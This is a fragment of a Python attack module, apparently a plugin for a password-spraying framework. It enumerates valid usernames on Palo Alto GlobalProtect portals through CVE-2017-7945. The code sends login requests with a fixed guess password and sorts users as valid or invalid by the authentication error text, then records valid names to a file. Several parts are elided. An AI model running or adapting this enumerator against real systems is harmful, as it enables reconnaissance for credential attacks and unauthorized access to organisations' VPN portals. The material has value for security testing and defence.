...
# username enumerator for Paloalto GlobalProtect vulnerable to
# https://security.paloaltonetworks.com/CVE-2017-7945 (perhaps)
# but have observed this behavior on at least pan-os 9.0.11
...
class OmniModule(object):
    ...
    def _execute(self, user, password):
        ...
        try:
            ...
            data  = f"action=getsoftware&user=" + user + "&passwd=Winter2020&ok=Log+In"
            ...
            # there's a variety of things that can come after the "...failed:" for valid users, so we'll test for invalid first
            if "Authentication failed: Invalid User" in r_body:
                logging.info("%s: INVALID", user)
            elif "Authentication failed:" in r_body:
                self.successful_results += 1
                self.success_file.write(f"{user}")
                logging.info("%s: VALID", user)
            else:
                logging.info("%s: Unexpected response", user)
